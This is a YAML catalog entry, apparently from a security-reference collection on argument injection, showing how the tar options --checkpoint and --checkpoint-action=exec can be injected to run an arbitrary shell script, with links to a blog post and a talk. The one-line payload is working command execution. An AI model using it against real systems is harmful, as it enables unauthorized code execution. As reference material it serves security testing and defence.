---
functions:
  command:
    - description: When injecting during archive creation, it requires injection of two arguments and a positional argument.
      code: tar '--checkpoint=1' '--checkpoint-action=exec="sh shell.sh"'
      references:
        - title: Argument injection and getting past shellwords.escape
          url: https://staaldraad.github.io/post/2019-11-24-argument-injection/
        - title: Joern Schneeweisz's talk "Argument Injection"
          url: https://docs.google.com/presentation/d/1U8r5CJs9dLOLO2-hj_bHidRMXugUl3ejv8Hdw6bDMv4/edit#slide=id.g6e36e58883_5_42
---
